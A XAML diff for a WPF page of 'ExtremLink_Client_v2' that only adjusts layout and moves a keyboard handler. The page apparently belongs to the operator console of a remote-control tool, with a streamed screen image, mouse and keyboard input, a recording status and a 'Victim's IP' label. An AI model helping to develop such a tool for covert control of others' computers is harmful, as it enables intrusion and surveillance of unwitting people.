@@ -5,7 +5,8 @@
              xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
              xmlns:local="clr-namespace:ExtremLink_Client_v2.Pages"
              mc:Ignorable="d" 
-             d:DesignHeight="600" d:DesignWidth="800">
+             d:DesignHeight="600" d:DesignWidth="800"
+             PreviewKeyDown ="FrameImg_KeyboardKeyDown">
     <Grid>
         <Grid.Background>
             <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
@@ -18,8 +19,7 @@
 
             <!-- Defualt Image -->
             <Image x:Name="frameImg" Source="/Images/default_image.png" Width="800" Height="450" VerticalAlignment="Top" HorizontalAlignment="Center"
-                   MouseMove="FrameImg_MouseMove" MouseDown="FrameImg_MouseDown"
-                   Keyboard.KeyDown="FrameImg_KeyboardKeyDown"/>
+                   MouseMove="FrameImg_MouseMove" MouseDown="FrameImg_MouseDown"/>
             <Grid>
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition/>
@@ -34,9 +34,18 @@
                 </Grid.RowDefinitions>
 
                 <!-- Details -->
-                <Rectangle Margin="5,-445,120,496" Fill="#90000000" Grid.ColumnSpan="2"/>
+                <Rectangle Margin="5,-445,15,496" Fill="#90000000" Grid.ColumnSpan="2"/>
                 <Image Source="/Images/pc_icon.png" Grid.ColumnSpan="1" Width="20" Height="20" Margin="7,-445,168,520" RenderTransformOrigin="0.496,0.508"/>
-                <TextBlock x:Name="clientIpTextBlock" FontFamily="Consolas" Text="Victim's IP:" VerticalAlignment="Top" Foreground="#00cec9" FontSize="15" Grid.ColumnSpan="2" Margin="35,-441,125,0"/>
+                <TextBlock x:Name="clientIpTextBlock" FontFamily="Consolas" Text="Victim's IP:" VerticalAlignment="Top" Foreground="#00cec9" FontSize="15" Grid.ColumnSpan="2" Margin="35,-441,18,0" Height="23" RenderTransformOrigin="0.5,0.5">
+                    <TextBlock.RenderTransform>
+                        <TransformGroup>
+                            <ScaleTransform/>
+                            <SkewTransform/>
+                            <RotateTransform Angle="0"/>
+                            <TranslateTransform/>
+                        </TransformGroup>
+                    </TextBlock.RenderTransform>
+                </TextBlock>
                 <Image Source="/Images/video_icon_1.png" Grid.ColumnSpan="1" Width="20" Height="20" Margin="7,-425,168,500" RenderTransformOrigin="0.496,0.58"/>
                 <TextBlock x:Name="recordingStatusTextBlock" FontFamily="Consolas" Text="Record: off" VerticalAlignment="Top" Foreground="#00cec9" FontSize="15" Grid.ColumnSpan="2" Margin="35,-418,192,0"/>
 
